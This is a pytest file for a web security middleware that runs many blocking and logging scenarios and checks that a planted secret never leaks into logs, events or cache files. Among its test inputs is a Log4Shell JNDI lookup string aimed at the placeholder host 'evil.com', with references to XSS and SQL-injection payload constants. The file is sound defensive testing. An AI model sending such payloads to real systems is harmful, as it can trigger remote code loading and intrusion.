def _run_blacklist_hit(secret: str, ctx: "_ScenarioContext") -> None:
    client_ip = _client_ip_for("blacklist_hit")
    geo_ip_handler = MagicMock()
    geo_ip_handler.get_country = MagicMock(side_effect=RuntimeError("geoip down"))
    config = _scenario_config(
        blacklist=[client_ip],
        enable_ip_banning=True,
        auto_ban_threshold=1,
        enable_penetration_detection=True,
    )
    middleware = _scenario_middleware(config, geo_ip_handler=geo_ip_handler)
    request = SyncMockGuardRequest(
        headers={"Authorization": f"{secret} {_XSS}"}, client_host=client_ip
    )
    pipeline = build_default_pipeline(middleware)
    response = pipeline.execute(request)
    assert response is not None, "blacklist_hit scenario never blocked"
    assert _ON_ERROR_CALLS, "blacklist_hit scenario never invoked on_error"

    dead_code_request = SyncMockGuardRequest(
        headers={"Authorization": secret}, client_host=client_ip
    )
    ip_security_check = next(
        c for c in pipeline.checks if c.check_name == "ip_security"
    )
    events_before = len(_AGENT_RECORDER.events)
    ip_security_check.log_if_allowed(
        dead_code_request,
        log_type="suspicious",
        reason="direct log_if_allowed exercise",
        trigger_info="direct",
    )
    ip_security_check.send_event(
        "direct_event", dead_code_request, "logged_only", "direct send_event exercise"
    )
    assert len(_AGENT_RECORDER.events) > events_before, (
        "blacklist_hit scenario never exercised SecurityCheck.send_event"
    )


def _run_banned_ip(secret: str, ctx: "_ScenarioContext") -> None:
    client_ip = _client_ip_for("banned_ip")
    config = _scenario_config()
    middleware = _scenario_middleware(config)
    ip_ban_manager.ban_ip(client_ip, 300, "test_ban")
    request = _tri_surface_request(secret, client_ip)
    pipeline = build_default_pipeline(middleware)
    response = pipeline.execute(request)
    assert response is not None, "banned_ip scenario never blocked"


def _run_route_ip_restricted(secret: str, ctx: "_ScenarioContext") -> None:
    client_ip = _client_ip_for("route_ip_restricted")
    route_config = RouteConfig()
    route_config.ip_whitelist = ["198.51.100.1"]
    config = _scenario_config(enable_ip_banning=False)
    middleware = _scenario_middleware(config, route_config=route_config)
    request = SyncMockGuardRequest(
        headers={_CUSTOM_SENSITIVE_HEADER: secret}, client_host=client_ip
    )
    pipeline = build_default_pipeline(middleware)
    response = pipeline.execute(request)
    assert response is not None, "route_ip_restricted scenario never blocked"


def _run_rate_limit_exceeded(secret: str, ctx: "_ScenarioContext") -> None:
    client_ip = _client_ip_for("rate_limit_exceeded")
    config = _scenario_config(
        enable_rate_limiting=True, rate_limit=1, rate_limit_window=60
    )
    middleware = _scenario_middleware(config)
    pipeline = build_default_pipeline(middleware)

    def _request() -> SyncMockGuardRequest:
        return _tri_surface_request(secret, client_ip)

    first = pipeline.execute(_request())
    assert first is None, (
        "rate_limit_exceeded scenario: first request unexpectedly blocked"
    )
    second = pipeline.execute(_request())
    assert second is not None, (
        "rate_limit_exceeded scenario never blocked on the second request"
    )


def _run_user_agent_block(secret: str, ctx: "_ScenarioContext") -> None:
    client_ip = _client_ip_for("user_agent_block")
    config = _scenario_config(blocked_user_agents=[re.escape(secret)])
    middleware = _scenario_middleware(config)
    user_agent = json.dumps({"password": secret})
    request = SyncMockGuardRequest(
        headers={"User-Agent": user_agent}, client_host=client_ip
    )
    pipeline = build_default_pipeline(middleware)
    response = pipeline.execute(request)
    assert response is not None, "user_agent_block scenario never blocked"


def _run_user_agent_block_pair_after_space(
    secret: str, ctx: "_ScenarioContext"
) -> None:
    client_ip = _client_ip_for("user_agent_block_pair_after_space")
    config = _scenario_config(blocked_user_agents=[re.escape(secret)])
    middleware = _scenario_middleware(config)
    user_agent = f"Mozilla/5.0 password={secret} {_XSS}"
    request = SyncMockGuardRequest(
        headers={"User-Agent": user_agent}, client_host=client_ip
    )
    pipeline = build_default_pipeline(middleware)
    response = pipeline.execute(request)
    assert response is not None, (
        "user_agent_block_pair_after_space scenario never blocked"
    )


def _run_required_header_missing(secret: str, ctx: "_ScenarioContext") -> None:
    client_ip = _client_ip_for("required_header_missing")
    route_config = RouteConfig()
    route_config.required_headers = {"X-Required-Token": "required"}
    config = _scenario_config()
    middleware = _scenario_middleware(config, route_config=route_config)
    request = SyncMockGuardRequest(
        headers={_CUSTOM_SENSITIVE_HEADER: secret}, client_host=client_ip
    )
    pipeline = build_default_pipeline(middleware)
    response = pipeline.execute(request)
    assert response is not None, "required_header_missing scenario never blocked"


def _run_required_header_mismatched(secret: str, ctx: "_ScenarioContext") -> None:
    client_ip = _client_ip_for("required_header_mismatched")
    route_config = RouteConfig()
    route_config.required_headers = {"X-Required-Token": "expected-value"}
    config = _scenario_config(log_sensitive_headers={"x-required-token"})
    middleware = _scenario_middleware(config, route_config=route_config)
    request = SyncMockGuardRequest(
        headers={"X-Required-Token": secret}, client_host=client_ip
    )
    pipeline = build_default_pipeline(middleware)
    response = pipeline.execute(request)
    assert response is not None, "required_header_mismatched scenario never blocked"


def _run_auth_missing(secret: str, ctx: "_ScenarioContext") -> None:
    client_ip = _client_ip_for("auth_missing")
    route_config = RouteConfig()
    route_config.auth_required = "bearer"
    config = _scenario_config()
    middleware = _scenario_middleware(config, route_config=route_config)
    request = SyncMockGuardRequest(
        headers={_CUSTOM_SENSITIVE_HEADER: secret}, client_host=client_ip
    )
    pipeline = build_default_pipeline(middleware)
    response = pipeline.execute(request)
    assert response is not None, "auth_missing scenario never blocked"


def _run_auth_invalid(secret: str, ctx: "_ScenarioContext") -> None:
    client_ip = _client_ip_for("auth_invalid")
    route_config = RouteConfig()
    route_config.auth_required = "bearer"
    route_config.auth_verifier = _auth_verifier_reject
    config = _scenario_config()
    middleware = _scenario_middleware(config, route_config=route_config)
    request = SyncMockGuardRequest(
        headers={"authorization": f"Bearer {secret}"}, client_host=client_ip
    )
    pipeline = build_default_pipeline(middleware)
    response = pipeline.execute(request)
    assert response is not None, "auth_invalid scenario never blocked"


def _run_scan_time_budget_exhausted(secret: str, ctx: "_ScenarioContext") -> None:
    config = _scenario_config(detection_max_scan_seconds=0.1)
    request = SyncMockGuardRequest(
        query_params={"token": f"{secret} {_SQLI}"},
        client_host=_client_ip_for("scan_time_budget_exhausted"),
    )
    with patch(
        "guard_core.sync._utils.detection_scan._scan_time_remaining", return_value=0.0
    ):
        result = detect_penetration_attempt(request, config)
    assert result.is_threat, "scan_time_budget_exhausted scenario never flagged"
    assert "scan_time_budget_exhausted" in result.trigger_info
    assert any(
        "detection_max_scan_seconds" in r.getMessage() for r in ctx.caplog.records
    )


def _run_referrer_invalid(secret: str, ctx: "_ScenarioContext") -> None:
    client_ip = _client_ip_for("referrer_invalid")
    route_config = RouteConfig()
    route_config.require_referrer = ["example.com"]
    config = _scenario_config()
    middleware = _scenario_middleware(config, route_config=route_config)
    referrer = json.dumps({"password": secret})
    request = SyncMockGuardRequest(headers={"referer": referrer}, client_host=client_ip)
    pipeline = build_default_pipeline(middleware)
    response = pipeline.execute(request)
    assert response is not None, "referrer_invalid scenario never blocked"


def _run_referrer_invalid_query_token(secret: str, ctx: "_ScenarioContext") -> None:
    client_ip = _client_ip_for("referrer_invalid_query_token")
    route_config = RouteConfig()
    route_config.require_referrer = ["example.com"]
    config = _scenario_config()
    middleware = _scenario_middleware(config, route_config=route_config)
    referrer = f"https://evil.example/path?token={secret} {_XSS}"
    request = SyncMockGuardRequest(headers={"referer": referrer}, client_host=client_ip)
    pipeline = build_default_pipeline(middleware)
    response = pipeline.execute(request)
    assert response is not None, "referrer_invalid_query_token scenario never blocked"


def _run_header_dump_pair_value(secret: str, ctx: "_ScenarioContext") -> None:
    client_ip = _client_ip_for("header_dump_pair_value")
    route_config = RouteConfig()
    route_config.required_headers = {"X-Required-Token": "required"}
    config = _scenario_config()
    middleware = _scenario_middleware(config, route_config=route_config)
    request = SyncMockGuardRequest(
        headers={"X-Trace": f"a=1&token={secret} {_XSS}"}, client_host=client_ip
    )
    pipeline = build_default_pipeline(middleware)
    response = pipeline.execute(request)
    assert response is not None, "header_dump_pair_value scenario never blocked"


def _run_custom_excluded_header_log4shell_with_pair(
    secret: str, ctx: "_ScenarioContext"
) -> None:
    client_ip = _client_ip_for("custom_excluded_header_log4shell_with_pair")
    config = _scenario_config(excluded_detection_headers={"x-custom-excluded"})
    middleware = _scenario_middleware(config)
    value = f"password={secret} ${{jndi:ldap://evil.com/a}}"
    request = SyncMockGuardRequest(
        headers={"X-Custom-Excluded": value}, client_host=client_ip
    )
    pipeline = build_default_pipeline(middleware)
    response = pipeline.execute(request)
    assert response is not None, (
        "custom_excluded_header_log4shell_with_pair scenario never blocked"
    )


def _run_custom_validator_echo(secret: str, ctx: "_ScenarioContext") -> None:
    client_ip = _client_ip_for("custom_validator_echo")

    def _validator(request: Any) -> Any:
        return MockGuardResponse(
            f"blocked: saw {request.headers.get(_CUSTOM_SENSITIVE_HEADER)}", 403
        )

    route_config = RouteConfig()
    route_config.custom_validators = [_validator]
    config = _scenario_config()
    middleware = _scenario_middleware(config, route_config=route_config)
    request = SyncMockGuardRequest(
        headers={_CUSTOM_SENSITIVE_HEADER: secret}, client_host=client_ip
    )
    pipeline = build_default_pipeline(middleware)
    response = pipeline.execute(request)
    assert response is not None, "custom_validator_echo scenario never blocked"


def _run_time_window_closed(secret: str, ctx: "_ScenarioContext") -> None:
    client_ip = _client_ip_for("time_window_closed")
    route_config = RouteConfig()
    route_config.time_restrictions = {
        "start": "00:00",
        "end": "00:01",
        "timezone": "UTC",
    }
    config = _scenario_config()
    middleware = _scenario_middleware(config, route_config=route_config)
    request = _tri_surface_request(secret, client_ip)
    pipeline = build_default_pipeline(middleware)
    time_window_check = next(
        c for c in pipeline.checks if c.check_name == "time_window"
    )
    with patch.object(
        time_window_check, "_check_time_window", new=MagicMock(return_value=False)
    ):
        response = pipeline.execute(request)
    assert response is not None, "time_window_closed scenario never blocked"


def _run_emergency_mode_denied(secret: str, ctx: "_ScenarioContext") -> None:
    client_ip = _client_ip_for("emergency_mode_denied")
    config = _scenario_config(emergency_mode=True, emergency_whitelist=[])
    middleware = _scenario_middleware(config)
    request = _tri_surface_request(secret, client_ip)
    pipeline = build_default_pipeline(middleware)
    response = pipeline.execute(request)
    assert response is not None, "emergency_mode_denied scenario never blocked"


def _run_cloud_blocked(secret: str, ctx: "_ScenarioContext") -> None:
    client_ip = _client_ip_for("cloud_blocked")
    config = _scenario_config(block_cloud_providers=frozenset({"AWS"}))
    middleware = _scenario_middleware(config)
    request = _tri_surface_request(secret, client_ip)
    pipeline = build_default_pipeline(middleware)
    with (
        patch(
            "guard_core.sync.handlers.cloud_handler.cloud_handler.is_cloud_ip",
            return_value=True,
        ),
        patch(
            "guard_core.sync.handlers.cloud_handler.cloud_handler."
            "get_cloud_provider_details",
            return_value=("AWS", "1.2.3.0/24"),
        ),
    ):
        response = pipeline.execute(request)
    assert response is not None, "cloud_blocked scenario never blocked"


def _run_country_blocked(secret: str, ctx: "_ScenarioContext") -> None:
    client_ip = _client_ip_for("country_blocked")
    geo_ip_handler = MagicMock()
    geo_ip_handler.get_country = MagicMock(return_value="XX")
    config = _scenario_config(
        blocked_countries=frozenset({"XX"}), geo_ip_handler=geo_ip_handler
    )
    middleware = _scenario_middleware(config, geo_ip_handler=geo_ip_handler)
    request = _tri_surface_request(secret, client_ip)
    pipeline = build_default_pipeline(middleware)
    response = pipeline.execute(request)
    assert response is not None, "country_blocked scenario never blocked"


def _run_request_logged(secret: str, ctx: "_ScenarioContext") -> None:
    client_ip = _client_ip_for("request_logged")
    config = _scenario_config(log_request_level="INFO")
    middleware = _scenario_middleware(config)
    request = _tri_surface_request(secret, client_ip)
    pipeline = build_default_pipeline(middleware)
    records_before = len(ctx.caplog.records)
    response = pipeline.execute(request)
    assert response is None, "request_logged scenario unexpectedly blocked"
    assert len(ctx.caplog.records) > records_before, (
        "request_logged scenario never logged the per-request log line"
    )


def _run_emergency_mode_whitelisted(secret: str, ctx: "_ScenarioContext") -> None:
    client_ip = _client_ip_for("emergency_mode_whitelisted")
    config = _scenario_config(emergency_mode=True, emergency_whitelist=[client_ip])
    middleware = _scenario_middleware(config)
    request = SyncMockGuardRequest(
        headers={_CUSTOM_SENSITIVE_HEADER: secret}, client_host=client_ip
    )
    pipeline = build_default_pipeline(middleware)
    records_before = len(ctx.caplog.records)
    response = pipeline.execute(request)
    assert response is None, "emergency_mode_whitelisted scenario unexpectedly blocked"
    assert len(ctx.caplog.records) > records_before, (
        "emergency_mode_whitelisted scenario never logged the whitelisted-access path"
    )


def _run_passive_mode_suspicious(secret: str, ctx: "_ScenarioContext") -> None:
    client_ip = _client_ip_for("passive_mode_suspicious")
    config = _scenario_config(passive_mode=True, enable_penetration_detection=True)
    middleware = _scenario_middleware(config)
    request = SyncMockGuardRequest(
        query_params={"token": f"{secret} {_XSS}"}, client_host=client_ip
    )
    pipeline = build_default_pipeline(middleware)
    events_before = len(_AGENT_RECORDER.events)
    response = pipeline.execute(request)
    assert response is None, "passive_mode_suspicious scenario unexpectedly blocked"
    assert len(_AGENT_RECORDER.events) > events_before, (
        "passive_mode_suspicious scenario emitted no events"
    )


def _custom_request_check_callback(request: Any) -> Any:
    return MockGuardResponse("blocked by custom check", 451)


def _run_custom_request_check_reason(secret: str, ctx: "_ScenarioContext") -> None:
    client_ip = _client_ip_for("custom_request_check_reason")
    config = _scenario_config(
        custom_request_check=_custom_request_check_callback,
        log_request_level="INFO",
    )
    middleware = _scenario_middleware(config)
    request = SyncMockGuardRequest(
        headers={_CUSTOM_SENSITIVE_HEADER: secret}, client_host=client_ip
    )
    pipeline = build_default_pipeline(middleware)
    response = pipeline.execute(request)
    assert response is not None, "custom_request_check_reason scenario never blocked"


def _run_request_size_violation(secret: str, ctx: "_ScenarioContext") -> None:
    client_ip = _client_ip_for("request_size_violation")
    route_config = RouteConfig()
    route_config.max_request_size = 10
    config = _scenario_config()
    middleware = _scenario_middleware(config, route_config=route_config)
    request = SyncMockGuardRequest(
        headers={_CUSTOM_SENSITIVE_HEADER: secret, "content-length": "999999"},
        client_host=client_ip,
    )
    pipeline = build_default_pipeline(middleware)
    response = pipeline.execute(request)
    assert response is not None, "request_size_violation scenario never blocked"


def _run_request_size_content_length_malformed_raises(
    secret: str, ctx: "_ScenarioContext"
) -> None:
    client_ip = _client_ip_for("request_size_content_length_malformed_raises")
    route_config = RouteConfig()
    route_config.max_request_size = 10
    config = _scenario_config(fail_secure=True)
    middleware = _scenario_middleware(config, route_config=route_config)
    request = SyncMockGuardRequest(
        headers={"content-length": f"?password={secret}"}, client_host=client_ip
    )
    pipeline = build_default_pipeline(middleware)
    response = pipeline.execute(request)
    assert response is not None, (
        "request_size_content_length_malformed_raises scenario produced no response"
    )


def _run_content_type_violation(secret: str, ctx: "_ScenarioContext") -> None:
    client_ip = _client_ip_for("content_type_violation")
    route_config = RouteConfig()
    route_config.allowed_content_types = ["application/json"]
    config = _scenario_config()
    middleware = _scenario_middleware(config, route_config=route_config)
    content_type = json.dumps({"password": secret})
    request = SyncMockGuardRequest(
        headers={"content-type": content_type}, client_host=client_ip
    )
    pipeline = build_default_pipeline(middleware)
    response = pipeline.execute(request)
    assert response is not None, "content_type_violation scenario never blocked"


def _run_suspicious_auto_ban_threshold_1(secret: str, ctx: "_ScenarioContext") -> None:
    client_ip = _client_ip_for("suspicious_auto_ban_threshold_1")
    config = _scenario_config(
        enable_penetration_detection=True,
        enable_ip_banning=True,
        auto_ban_threshold=1,
    )
    middleware = _scenario_middleware(config)
    request = SyncMockGuardRequest(
        query_params={"token": f"{secret} {_SQLI}"}, client_host=client_ip
    )
    pipeline = build_default_pipeline(middleware)
    response = pipeline.execute(request)
    assert response is not None, (
        "suspicious_auto_ban_threshold_1 scenario never blocked"
    )
    assert ip_ban_manager.is_ip_banned(client_ip), (
        "suspicious_auto_ban_threshold_1 scenario never actually banned the IP"
    )


def _run_behavior_usage_frequency_endpoint(
    secret: str, ctx: "_ScenarioContext"
) -> None:
    client_ip = _client_ip_for("behavior_usage_frequency_endpoint")
    config = _scenario_config()
    event_bus = SecurityEventBus(agent_handler=_AGENT_RECORDER, config=config)
    tracker = BehaviorTracker(config)
    tracker.agent_handler = _AGENT_RECORDER
    context = BehavioralContext(
        config=config,
        logger=logging.getLogger("guard_core.test.sensitive_invariant.behavior"),
        event_bus=event_bus,
        guard_decorator=None,
        behavior_tracker=tracker,
        middleware=None,
    )
    processor = BehavioralProcessor(context)
    route_config = RouteConfig()
    route_config.behavior_rules = [
        BehaviorRule(rule_type="usage", threshold=0, window=60, action="log"),
        BehaviorRule(rule_type="frequency", threshold=0, window=60, action="ban"),
    ]
    request = SyncMockGuardRequest(path=f"/items;token={secret}", client_host=client_ip)
    events_before = len(_AGENT_RECORDER.events)
    processor.process_usage_rules(request, client_ip, route_config)
    assert len(_AGENT_RECORDER.events) > events_before, (
        "behavior_usage_frequency_endpoint scenario emitted no events"
    )
    assert ip_ban_manager.is_ip_banned(client_ip), (
        "behavior_usage_frequency_endpoint scenario never exercised the ban action"
    )


def _run_behavior_return_pattern_body_scan(
    secret: str, ctx: "_ScenarioContext"
) -> None:
    client_ip = _client_ip_for("behavior_return_pattern_body_scan")
    config = _scenario_config(behavior_scan_response_body=True)
    event_bus = SecurityEventBus(agent_handler=_AGENT_RECORDER, config=config)
    tracker = BehaviorTracker(config)
    tracker.agent_handler = _AGENT_RECORDER
    context = BehavioralContext(
        config=config,
        logger=logging.getLogger("guard_core.test.sensitive_invariant.behavior"),
        event_bus=event_bus,
        guard_decorator=None,
        behavior_tracker=tracker,
        middleware=None,
    )
    processor = BehavioralProcessor(context)
    route_config = RouteConfig()
    route_config.behavior_rules = [
        BehaviorRule(
            rule_type="return_pattern", pattern="password", threshold=0, window=60
        ),
    ]
    request = SyncMockGuardRequest(path="/items", client_host=client_ip)
    response = _StreamedResponse(json.dumps({"password": secret}), 200)
    events_before = len(_AGENT_RECORDER.events)
    processor.process_return_rules(request, response, client_ip, route_config)
    assert len(_AGENT_RECORDER.events) > events_before, (
        "behavior_return_pattern_body_scan scenario emitted no events"
    )
    global_events_before = len(_AGENT_RECORDER.events)
    processor.process_global_return_rules(
        request, response, client_ip, route_config.behavior_rules
    )
    assert len(_AGENT_RECORDER.events) > global_events_before, (
        "behavior_return_pattern_body_scan scenario never exercised "
        "process_global_return_rules"
    )


def _run_xff_spoof_warning(secret: str, ctx: "_ScenarioContext") -> None:
    config = _scenario_config(trusted_proxies=("10.0.0.1",))
    request = SyncMockGuardRequest(
        headers={"X-Forwarded-For": f"{secret}, 203.0.113.9"},
        client_host="198.51.100.5",
    )
    events_before = len(_AGENT_RECORDER.events)
    client_ip = extract_client_ip(request, config, _AGENT_RECORDER)
    assert client_ip, "xff_spoof_warning scenario produced no client ip"
    assert len(_AGENT_RECORDER.events) > events_before, (
        "xff_spoof_warning scenario emitted no agent event"
    )

    trusted_config = _scenario_config(
        trusted_proxies=("10.0.0.1",), trusted_proxy_depth=5
    )
    short_chain_request = SyncMockGuardRequest(
        headers={"X-Forwarded-For": f"{secret}, 203.0.113.9"},
        client_host="10.0.0.1",
    )
    short_chain_ip = extract_client_ip(
        short_chain_request, trusted_config, _AGENT_RECORDER
    )
    assert short_chain_ip, "xff_spoof_warning scenario produced no client ip"

    overcount_config = _scenario_config(
        trusted_proxies=("10.0.0.1",), trusted_proxy_depth=2
    )
    overcount_request = SyncMockGuardRequest(
        headers={"X-Forwarded-For": f"{secret}, 203.0.113.9, 203.0.113.10"},
        client_host="10.0.0.1",
    )
    overcount_ip = extract_client_ip(
        overcount_request, overcount_config, _AGENT_RECORDER
    )
    assert overcount_ip, "xff_spoof_warning scenario produced no client ip"


def _run_dynamic_rules_snapshot_no_leak(secret: str, ctx: "_ScenarioContext") -> None:
    client_ip = _client_ip_for("dynamic_rules_snapshot_no_leak")
    cache_path = ctx.tmp_path / "dynamic_rules_snapshot.json"
    config = _scenario_config(dynamic_rules_cache_path=cache_path)
    target = _SnapshotPersistTarget(config)
    rules = DynamicRules(
        rule_id="test-rule",
        version=1,
        timestamp=datetime.now(timezone.utc),
        ip_blacklist=[client_ip],
    )
    request = SyncMockGuardRequest(
        headers={"Authorization": secret}, client_host=client_ip
    )
    detect_penetration_attempt(request, config)
    target._persist_last_known_rules(rules)
    assert cache_path.exists(), (
        "dynamic_rules_snapshot_no_leak scenario never persisted a snapshot file"
    )
    assert secret not in cache_path.read_text(), (
        "dynamic_rules_snapshot_no_leak scenario leaked the secret into the "
        "snapshot file"
    )


def _run_agent_metrics_endpoint(secret: str, ctx: "_ScenarioContext") -> None:
    client_ip = _client_ip_for("agent_metrics_endpoint")
    config = _scenario_config()
    collector = MetricsCollector(agent_handler=_AGENT_RECORDER, config=config)
    request = SyncMockGuardRequest(path=f"/items;token={secret}", client_host=client_ip)
    metrics_before = len(_AGENT_RECORDER.metrics)
    collector.collect_request_metrics(request, response_time=0.01, status_code=403)
    assert len(_AGENT_RECORDER.metrics) > metrics_before, (
        "agent_metrics_endpoint scenario emitted no metrics"
    )


def _run_path_excluded_event(secret: str, ctx: "_ScenarioContext") -> None:
    client_ip = _client_ip_for("path_excluded_event")
    config = _scenario_config(exclude_paths=["/static"])
    event_bus = SecurityEventBus(agent_handler=_AGENT_RECORDER, config=config)
    context = ValidationContext(
        config=config,
        logger=logging.getLogger("guard_core.test.sensitive_invariant.validation"),
        event_bus=event_bus,
    )
    validator = RequestValidator(context)
    request = SyncMockGuardRequest(
        path=f"/static/resource;token={secret}", client_host=client_ip
    )
    events_before = len(_AGENT_RECORDER.events)
    excluded = validator.is_path_excluded(request)
    assert excluded, "path_excluded_event scenario never matched an excluded path"
    assert len(_AGENT_RECORDER.events) > events_before, (
        "path_excluded_event scenario emitted no events"
    )


def _run_security_bypass_event(secret: str, ctx: "_ScenarioContext") -> None:
    client_ip = _client_ip_for("security_bypass_event")
    config = _scenario_config(passive_mode=True)
    event_bus = SecurityEventBus(agent_handler=_AGENT_RECORDER, config=config)
    route_resolver = MagicMock()
    route_resolver.should_bypass_check = MagicMock(return_value=True)
    response_factory = MagicMock()
    validator = MagicMock()
    validator.is_path_excluded = MagicMock(return_value=False)
    context = BypassContext(
        config=config,
        logger=logging.getLogger("guard_core.test.sensitive_invariant.bypass"),
        event_bus=event_bus,
        route_resolver=route_resolver,
        response_factory=response_factory,
        validator=validator,
    )
    handler = BypassHandler(context)
    route_config = RouteConfig()
    route_config.bypassed_checks = {"all"}

    def _call_next(request: Any) -> Any:
        raise AssertionError("call_next should not run in passive mode")

    request = SyncMockGuardRequest(path=f"/items;token={secret}", client_host=client_ip)
    events_before = len(_AGENT_RECORDER.events)
    handler.handle_security_bypass(request, _call_next, route_config)
    assert len(_AGENT_RECORDER.events) > events_before, (
        "security_bypass_event scenario emitted no events"
    )


def _run_decorator_event_leak(secret: str, ctx: "_ScenarioContext") -> None:
    client_ip = _client_ip_for("decorator_event_leak")
    config = _scenario_config()
    decorator = BaseSecurityDecorator(config)
    decorator.agent_handler = _AGENT_RECORDER
    request = SyncMockGuardRequest(
        path=f"/items;token={secret}",
        headers={"User-Agent": json.dumps({"password": secret})},
        client_host=client_ip,
    )
    events_before = len(_AGENT_RECORDER.events)
    decorator.send_decorator_event(
        "test_event", request, "blocked", "reason text", "test_decorator"
    )
    assert len(_AGENT_RECORDER.events) > events_before, (
        "decorator_event_leak scenario emitted no events"
    )


def _run_security_headers_csp_report(secret: str, ctx: "_ScenarioContext") -> None:
    client_ip = _client_ip_for("security_headers_csp_report")
    security_headers_manager.agent_handler = _AGENT_RECORDER
    events_before = len(_AGENT_RECORDER.events)
    try:
        valid = security_headers_manager.validate_csp_report(
            {
                "csp-report": {
                    "document-uri": f"https://example.com/report?token={secret}",
                    "violated-directive": f"script-src token={secret}",
                    "blocked-uri": f"https://evil.example/x?token={secret}",
                    "source-file": f"https://cdn.example/app.js?token={secret}",
                    "line-number": f"token={secret}",
                    "column-number": f"token={secret}",
                    "original-policy": f"default-src 'self'; token={secret}",
                    "referrer": f"https://example.com/?token={secret}",
                    "status-code": f"token={secret}",
                    "script-sample": f"token={secret}",
                    "disposition": f"token={secret}",
                }
            }
        )
        assert valid, "security_headers_csp_report scenario rejected the CSP report"
        security_headers_manager._send_headers_applied_event(
            f"/items;token={secret}", {"Content-Security-Policy": "default-src 'self'"}
        )
    finally:
        security_headers_manager.agent_handler = None
    assert len(_AGENT_RECORDER.events) > events_before, (
        f"security_headers_csp_report scenario emitted no events, client {client_ip}"
    )


def _run_https_redirect_url_leak(secret: str, ctx: "_ScenarioContext") -> None:
    client_ip = _client_ip_for("https_redirect_url_leak")
    config = _scenario_config()
    event_bus = SecurityEventBus(agent_handler=_AGENT_RECORDER, config=config)
    request = SyncMockGuardRequest(
        path=f"/items;token={secret}", scheme="http", client_host=client_ip
    )
    events_before = len(_AGENT_RECORDER.events)
    event_bus.send_https_violation_event(request, None)
    assert len(_AGENT_RECORDER.events) > events_before, (
        "https_redirect_url_leak scenario emitted no events"
    )


def _run_pipeline_rebuild_error_path_leak(secret: str, ctx: "_ScenarioContext") -> None:
    client_ip = _client_ip_for("pipeline_rebuild_error_path_leak")
    config = _scenario_config()
    middleware = _scenario_middleware(config)
    pipeline = build_default_pipeline(middleware)

    def _boom() -> list[Any]:
        raise RuntimeError("rebuild boom")

    pipeline._built_revision = -1
    pipeline._rebuild_checks = _boom
    request = SyncMockGuardRequest(path=f"/items/{secret}", client_host=client_ip)
    response = pipeline.execute(request)
    assert response is not None, (
        "pipeline_rebuild_error_path_leak scenario produced no response"
    )


@dataclass
class _ScenarioContext:
    caplog: pytest.LogCaptureFixture
    tmp_path: Path


@dataclass(frozen=True)
class ComponentScenario:
    id: str
    run: Callable[[str, _ScenarioContext], Any]


_COMPONENT_SCENARIOS: list[ComponentScenario] = [
    ComponentScenario("blacklist_hit", _run_blacklist_hit),
    ComponentScenario("banned_ip", _run_banned_ip),
    ComponentScenario("route_ip_restricted", _run_route_ip_restricted),
    ComponentScenario("rate_limit_exceeded", _run_rate_limit_exceeded),
    ComponentScenario("cloud_blocked", _run_cloud_blocked),
    ComponentScenario("country_blocked", _run_country_blocked),
    ComponentScenario("request_logged", _run_request_logged),
    ComponentScenario("user_agent_block", _run_user_agent_block),
    ComponentScenario(
        "user_agent_block_pair_after_space", _run_user_agent_block_pair_after_space
    ),
    ComponentScenario("required_header_missing", _run_required_header_missing),
    ComponentScenario("required_header_mismatched", _run_required_header_mismatched),
    ComponentScenario("auth_missing", _run_auth_missing),
    ComponentScenario("auth_invalid", _run_auth_invalid),
    ComponentScenario("referrer_invalid", _run_referrer_invalid),
    ComponentScenario("scan_time_budget_exhausted", _run_scan_time_budget_exhausted),
    ComponentScenario(
        "referrer_invalid_query_token", _run_referrer_invalid_query_token
    ),
    ComponentScenario("header_dump_pair_value", _run_header_dump_pair_value),
    ComponentScenario(
        "custom_excluded_header_log4shell_with_pair",
        _run_custom_excluded_header_log4shell_with_pair,
    ),
    ComponentScenario("custom_validator_echo", _run_custom_validator_echo),
    ComponentScenario("time_window_closed", _run_time_window_closed),
    ComponentScenario("emergency_mode_denied", _run_emergency_mode_denied),
    ComponentScenario("emergency_mode_whitelisted", _run_emergency_mode_whitelisted),
    ComponentScenario("passive_mode_suspicious", _run_passive_mode_suspicious),
    ComponentScenario("custom_request_check_reason", _run_custom_request_check_reason),
    ComponentScenario("request_size_violation", _run_request_size_violation),
    ComponentScenario(
        "request_size_content_length_malformed_raises",
        _run_request_size_content_length_malformed_raises,
    ),
    ComponentScenario("content_type_violation", _run_content_type_violation),
    ComponentScenario(
        "suspicious_auto_ban_threshold_1", _run_suspicious_auto_ban_threshold_1
    ),
    ComponentScenario(
        "behavior_usage_frequency_endpoint", _run_behavior_usage_frequency_endpoint
    ),
    ComponentScenario(
        "behavior_return_pattern_body_scan", _run_behavior_return_pattern_body_scan
    ),
    ComponentScenario("xff_spoof_warning", _run_xff_spoof_warning),
    ComponentScenario(
        "dynamic_rules_snapshot_no_leak", _run_dynamic_rules_snapshot_no_leak
    ),
    ComponentScenario("agent_metrics_endpoint", _run_agent_metrics_endpoint),
    ComponentScenario("path_excluded_event", _run_path_excluded_event),
    ComponentScenario("security_bypass_event", _run_security_bypass_event),
    ComponentScenario("decorator_event_leak", _run_decorator_event_leak),
    ComponentScenario("security_headers_csp_report", _run_security_headers_csp_report),
    ComponentScenario("https_redirect_url_leak", _run_https_redirect_url_leak),
    ComponentScenario(
        "pipeline_rebuild_error_path_leak", _run_pipeline_rebuild_error_path_leak
    ),
]


def test_component_scenario_matrix_has_unique_ids() -> None:
    ids = [scenario.id for scenario in _COMPONENT_SCENARIOS]
    assert len(ids) == len(set(ids))
    assert len(_COMPONENT_SCENARIOS) >= 25


@pytest.mark.parametrize("scenario", _COMPONENT_SCENARIOS, ids=lambda s: s.id)
def test_component_scenario_secret_never_reaches_guard_core_output(
    scenario: ComponentScenario,
    caplog: pytest.LogCaptureFixture,
    tmp_path: Path,
) -> None:
    secret = f"SECRET-{scenario.id}"
    ctx = _ScenarioContext(caplog=caplog, tmp_path=tmp_path)

    with caplog.at_level(logging.DEBUG):
        scenario.run(secret, ctx)

    assert secret not in caplog.text, (
        f"scenario {scenario.id!r} leaked the secret into a log line: {caplog.text!r}"
    )
    _assert_secret_absent_everywhere(secret, scenario.id)
